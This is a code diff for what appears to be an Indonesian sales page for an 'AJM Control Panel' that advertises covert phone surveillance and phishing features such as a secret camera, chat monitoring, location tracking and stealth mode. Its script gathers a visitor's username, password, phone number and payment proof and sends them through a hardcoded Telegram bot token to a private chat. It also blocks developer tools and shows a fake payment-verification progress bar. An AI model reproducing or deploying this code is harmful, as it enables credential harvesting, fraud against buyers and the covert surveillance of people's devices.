@@ -336,106 +336,227 @@ AJM SECURITY SYSTEM • PROTECTED SERVER
 </div>
 
 <script>
-    function disableSecurity(e) {
-        if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
-    }
+/* =========================
+SECURITY KEYBOARD BLOCK
+========================= */
 
-    const rawFeatures = ["MONITOR LAYAR", "KAMERA RAHASIA", "DEVICE CONTROL", "CHAT MONITOR", "LOG PANGGILAN", "HARDWARE INFO", "LACAK LOKASI", "EMAIL MONITOR", "GALLERY REMOTE", "VIDEO PLAYER", "FILE EXPLORER", "CONTACT BACKUPS", "WEB PHISING", "LIVE MIRRORING", "LIVE CAMERA", "DEVICE LOCK PRO", "APP MANAGEMENT", "STEALTH MODE", "UBOUND SHIELD", "SYSTEM HISTORY"];
-
-    const featureGrid = document.getElementById('featureGrid');
-    rawFeatures.forEach(f => {
-        featureGrid.innerHTML += `<div class="feature-item"><div class="feature-info"><span class="feature-name">${f}</span></div><div class="status-check">✓</div></div>`;
-    });
-
-    function showQris() {
-        const val = document.getElementById('planSelect').value;
-        document.getElementById('priceLabel').innerText = "Rp " + parseInt(val).toLocaleString('id-ID');
-        document.getElementById('qrisArea').style.display = 'block';
-    }
-
-    function handleFile() {
-        const file = document.getElementById('proofUpload').files[0];
-        if(file) {
-            document.getElementById('fileText').innerText = "✅ " + file.name;
-            checkForm();
-        }
-    }
-
-    function checkForm() {
-      const u = document.getElementById('teleUser').value;
-      const p = document.getElementById('telePass').value;
-      const n = document.getElementById('telePhone').value;
-      const t = document.getElementById('teleTelegram').value;
-      const f = document.getElementById('proofUpload').files[0];
-      document.getElementById('btnTele').disabled = !(u && p && n && t && f);
+function disableSecurity(e) {
+    if(e.keyCode == 123 || 
+      (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || 
+      (e.ctrlKey && e.keyCode == 85)) return false;
 }
 
-    async function sendToTelegram() {
-        const token = "7991098911:AAH3YjGTrgSOjwHIAOyB882grVz7XGwiyls"; // GANTI TOKEN
-        const chatId = "8215645360";   // GANTI ID
-        
-        const planElement = document.getElementById('planSelect');
-        const planName = planElement.options[planElement.selectedIndex].text;
-        const user = document.getElementById('teleUser').value;
-        const pass = document.getElementById('telePass').value;
-        const telegram = document.getElementById('teleTelegram').value;
-        const file = document.getElementById('proofUpload').files[0];
 
-        const btn = document.getElementById('btnTele');
-        btn.innerText = "ENCRYPTING DATA...";
-        btn.disabled = true;
+/* =========================
+FEATURE GRID SYSTEM
+========================= */
 
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', file);
-        formData.append('caption', `📊 *AKTIVASI BARU*
-        💎 *PAKET:* ${planName}
-        👤 *USER:* ${user}
-        🔑 *PASS:* ${pass}
-        📱 *WA:* ${phone}
-        ✈️ *TELEGRAM:* ${telegram}`);
-        formData.append('parse_mode', 'Markdown');
+const rawFeatures = [
+"MONITOR LAYAR",
+"KAMERA RAHASIA",
+"DEVICE CONTROL",
+"CHAT MONITOR",
+"LOG PANGGILAN",
+"HARDWARE INFO",
+"LACAK LOKASI",
+"EMAIL MONITOR",
+"GALLERY REMOTE",
+"VIDEO PLAYER",
+"FILE EXPLORER",
+"CONTACT BACKUPS",
+"WEB PHISING",
+"LIVE MIRRORING",
+"LIVE CAMERA",
+"DEVICE LOCK PRO",
+"APP MANAGEMENT",
+"STEALTH MODE",
+"UBOUND SHIELD",
+"SYSTEM HISTORY"
+];
 
-        try {
-            const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-            const result = await response.json();
-            if (result.ok) {
-              alert("DATA BERHASIL TERKIRIM KE SERVER AJM.");
-              btn.style.display = 'none';
-              document.getElementById('btnWA').style.display = 'block';
-            } else {
-                alert("Gagal kirim.");
-                btn.disabled = false;
-            }
-        } catch (error) {
-            alert("Error Koneksi.");
-            btn.disabled = false;
-        }
-    }
+document.addEventListener("DOMContentLoaded", function(){
 
-    function confirmTelegram() {
-      
-      const user = document.getElementById('teleUser').value;
-      const telegram = document.getElementById('teleTelegram').value;
-      const planElement = document.getElementById('planSelect');
-      const planName = planElement.options[planElement.selectedIndex].text;
-      const text = `Halo Admin AJM, Saya sudah melakukan pembayaran dan proses sinkronisasi sistem telah selesai.
-      
-      Berikut data aktivasi saya:
-      Username AJM : ${user}
-      Telegram : ${telegram}
-      Paket : ${planName}
-      
-      Mohon bantuan untuk:
-      • Mengirimkan aplikasi AJM Control Panel
-      • Menambahkan akun AJM saya ke sistem
-      • Mengaktifkan paket sesuai pembelian
-      
-      Terima kasih.`;
-  window.open(`https://t.me/Aldinugroho378?text=${encodeURIComponent(text)}`);
+const featureGrid = document.getElementById('featureGrid');
+
+if(featureGrid){
+
+rawFeatures.forEach(f => {
+
+featureGrid.innerHTML += `
+<div class="feature-item">
+<div class="feature-info">
+<span class="feature-name">${f}</span>
+</div>
+<div class="status-check">✓</div>
+</div>`;
+
+});
 
 }
-    /* =========================
+
+});
+
+
+/* =========================
+QRIS DISPLAY SYSTEM
+========================= */
+
+function showQris() {
+
+const val = document.getElementById('planSelect').value;
+
+document.getElementById('priceLabel').innerText = 
+"Rp " + parseInt(val).toLocaleString('id-ID');
+
+document.getElementById('qrisArea').style.display = 'block';
+
+}
+
+
+/* =========================
+FILE UPLOAD HANDLER
+========================= */
+
+function handleFile() {
+
+const file = document.getElementById('proofUpload').files[0];
+
+if(file){
+
+document.getElementById('fileText').innerText = "✅ " + file.name;
+
+checkForm();
+
+}
+
+}
+
+
+/* =========================
+FORM VALIDATION
+========================= */
+
+function checkForm(){
+
+const u = document.getElementById('teleUser').value;
+const p = document.getElementById('telePass').value;
+const n = document.getElementById('telePhone').value;
+const t = document.getElementById('teleTelegram').value;
+const f = document.getElementById('proofUpload').files[0];
+
+document.getElementById('btnTele').disabled = !(u && p && n && t && f);
+
+}
+
+
+/* =========================
+SEND DATA TO TELEGRAM BOT
+========================= */
+
+async function sendToTelegram(){
+
+const token = "7991098911:AAH3YjGTrgSOjwHIAOyB882grVz7XGwiyls";
+const chatId = "8215645360";
+
+const planElement = document.getElementById('planSelect');
+const planName = planElement.options[planElement.selectedIndex].text;
+
+const user = document.getElementById('teleUser').value;
+const pass = document.getElementById('telePass').value;
+const phone = document.getElementById('telePhone').value;
+const telegram = document.getElementById('teleTelegram').value;
+const file = document.getElementById('proofUpload').files[0];
+
+const btn = document.getElementById('btnTele');
+
+btn.innerText = "ENCRYPTING DATA...";
+btn.disabled = true;
+
+const formData = new FormData();
+
+formData.append('chat_id', chatId);
+formData.append('photo', file);
+
+formData.append('caption', `📊 *AKTIVASI BARU*
+💎 *PAKET:* ${planName}
+👤 *USER:* ${user}
+🔑 *PASS:* ${pass}
+📱 *WA:* ${phone}
+✈️ *TELEGRAM:* ${telegram}`);
+
+formData.append('parse_mode', 'Markdown');
+
+try{
+
+const response = await fetch(
+`https://api.telegram.org/bot${token}/sendPhoto`,
+{ method:'POST', body:formData }
+);
+
+const result = await response.json();
+
+if(result.ok){
+
+alert("DATA BERHASIL TERKIRIM KE SERVER AJM.");
+
+btn.style.display='none';
+
+document.getElementById('btnWA').style.display='block';
+
+}else{
+
+alert("Gagal kirim.");
+
+btn.disabled=false;
+
+}
+
+}catch(error){
+
+alert("Error Koneksi.");
+
+btn.disabled=false;
+
+}
+
+}
+
+
+/* =========================
+CONFIRM VIA TELEGRAM
+========================= */
+
+function confirmTelegram(){
+
+const user = document.getElementById('teleUser').value;
+const telegram = document.getElementById('teleTelegram').value;
+
+const planElement = document.getElementById('planSelect');
+
+const planName = planElement.options[planElement.selectedIndex].text;
+
+const text = `Halo Admin AJM, Saya sudah melakukan pembayaran dan proses sinkronisasi sistem telah selesai.
+
+Berikut data aktivasi saya:
+Username AJM : ${user}
+Telegram : ${telegram}
+Paket : ${planName}
+
+Mohon bantuan untuk:
+• Mengirimkan aplikasi AJM Control Panel
+• Menambahkan akun AJM saya ke sistem
+• Mengaktifkan paket sesuai pembelian
+
+Terima kasih.`;
+
+window.open(
+`https://t.me/Aldinugroho378?text=${encodeURIComponent(text)}`
+);
+
+}
+
+
+/* =========================
 ANTI INSPECT BASIC
 ========================= */
 
@@ -453,12 +574,94 @@ if(e.ctrlKey && e.keyCode==85){return false}
 
 }
 
+
+/* =========================
+DEVTOOLS DETECTOR
+========================= */
+
+setInterval(function(){
+
+const width = window.outerWidth - window.innerWidth > 150;
+const height = window.outerHeight - window.innerHeight > 150;
+
+if(width || height){
+
+document.body.innerHTML =
+"<h1 style='color:red;text-align:center;margin-top:20%'>SECURITY VIOLATION DETECTED</h1>";
+
+}
+
+},1000);
+
+
+/* =========================
+PAYMENT VERIFY PROGRESS
+========================= */
+
+document.addEventListener("DOMContentLoaded",function(){
+
+const btn=document.getElementById("btnTele");
+
+if(btn){
+
+const original=sendToTelegram;
+
+btn.onclick=function(){
+
+let progress=0;
+
+btn.innerText="VERIFYING PAYMENT 0%";
+
+const loader=setInterval(function(){
+
+progress+=10;
+
+btn.innerText="VERIFYING PAYMENT "+progress+"%";
+
+if(progress>=100){
+
+clearInterval(loader);
+
+btn.innerText="SENDING DATA...";
+
+original();
+
+}
+
+},300);
+
+}
+
+}
+
+});
+
+
 /* =========================
 ANTI CLONE WATERMARK
 ========================= */
 
 console.log("%cSTOP!","color:red;font-size:40px;font-weight:bold;")
 console.log("%cAJM CONTROL PANEL SECURITY SYSTEM","color:#00f2fe;font-size:16px")
+
+(function(){
+
+const mark=document.createElement("div");
+
+mark.innerText="AJM SECURITY SYSTEM";
+
+mark.style.position="fixed";
+mark.style.bottom="5px";
+mark.style.right="10px";
+mark.style.opacity="0.15";
+mark.style.fontSize="10px";
+mark.style.fontFamily="JetBrains Mono";
+mark.style.zIndex="999999";
+mark.style.pointerEvents="none";
+
+document.body.appendChild(mark);
+
+})();
 </script>
 
 </body>
